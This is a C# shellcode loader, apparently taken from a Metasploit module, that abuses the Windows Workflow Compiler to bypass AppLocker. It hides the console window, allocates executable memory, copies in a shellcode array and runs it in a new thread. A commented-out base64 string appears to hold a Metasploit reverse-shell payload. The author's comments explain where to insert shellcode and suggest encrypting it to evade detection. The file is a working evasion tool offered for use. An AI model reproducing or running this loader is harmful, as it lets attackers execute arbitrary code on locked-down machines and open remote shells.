using System;
using System.Workflow.Activities;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

//These comments should be removed before compiling. This is from metasploits module evasion applocker workflow compiler
// What you can do is get rid of the //string and //byte that I highlighted. In the original these are used to load base64 metasploit payload. You could still change it to do some sort of encryption
// and decryption, load it in another format etc. I commented it out so I would just have byte[] DYHMrlWZ which is where the shellcode goes. Works great as POC of workflow compiler
// applocker evasion method. 
public class yBLLSlJH : SequentialWorkflowActivity
{
    public yBLLSlJH()
    {
        iQetnfai();
    }
    public static void iQetnfai()
    {
        IntPtr fJOWNjcb;
        fJOWNjcb = GetConsoleWindow();
        ShowWindow(fJOWNjcb, ThEzTtEN);
        //string NwixTprP = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcrBFn9UFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbqZpXRh/9VIgcRAAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==";
        //byte[] oyfTEWkn = Convert.FromBase64String(NwixTprP);
        byte[] DYHMrlWZ = {
            <shellcode goes here>
        };
        IntPtr NuxOEAlh = VirtualAlloc(IntPtr.Zero, (UIntPtr)DYHMrlWZ.Length, PmdujqBS, NtaDDLOP);
        System.Runtime.InteropServices.Marshal.Copy(DYHMrlWZ, 0, NuxOEAlh, DYHMrlWZ.Length);
        IntPtr piOnPsGc = IntPtr.Zero;
        WaitForSingleObject(CreateThread(piOnPsGc, UIntPtr.Zero, NuxOEAlh, piOnPsGc, 0, ref piOnPsGc), xmkaqTcX);
    }
    private static Int32 PmdujqBS=0x1000;
    private static IntPtr NtaDDLOP=(IntPtr)0x40;
    private static UInt32 xmkaqTcX = 0xFFFFFFFF;
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr piOnPsGc);
    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr fJOWNjcb, int nCmdShow);
    [System.Runtime.InteropServices.DllImport("Kernel32")]
    private static extern IntPtr GetConsoleWindow();
    const int ThEzTtEN = 0;
}
